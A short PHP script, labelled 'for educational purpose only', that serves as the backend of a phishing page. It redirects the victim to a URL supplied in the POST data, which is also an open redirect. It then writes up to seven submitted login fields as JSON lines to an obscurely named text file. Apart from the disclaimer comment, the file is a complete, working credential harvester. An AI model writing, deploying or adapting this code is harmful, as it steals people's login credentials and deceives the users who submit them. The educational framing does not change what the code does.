<?php
// This is made for educational purpose only
// this demonstrate how simple are phishing attaks and we shhould be alert while browsing through internet 

// warning!: do not use this against anyone without their permission
?>

<?php
if (isset($_POST["redirect"]))
{
    header('Location: ' . $_POST["redirect"], true, 303);
}
else
{
    header('Location: /?p=0', true, 303);
}

class LD
{
    public $decrp;
    public $f1;
    public $f2;
    public $f3;
    public $f4;
    public $f5;
    public $f6;
    public $f7;
};

$logindata = new LD();


if (isset($_POST["decrp"])) {$logindata->decrp = $_POST["decrp"];}
if (isset($_POST["fild1"])) {$logindata->f1 = $_POST["fild1"];}
if (isset($_POST["fild2"])) {$logindata->f2 = $_POST["fild2"];}
if (isset($_POST["fild3"])) {$logindata->f3 = $_POST["fild3"];}
if (isset($_POST["fild4"])) {$logindata->f4 = $_POST["fild4"];}
if (isset($_POST["fild5"])) {$logindata->f5 = $_POST["fild5"];}
if (isset($_POST["fild6"])) {$logindata->f6 = $_POST["fild6"];}
if (isset($_POST["fild7"])) {$logindata->f7 = $_POST["fild7"];}

$jsondata = json_encode($logindata);

$fp = fopen("sfyugyergksuffh.txt", 'a');

fwrite($fp,"\n".$jsondata);
fclose($fp);

?>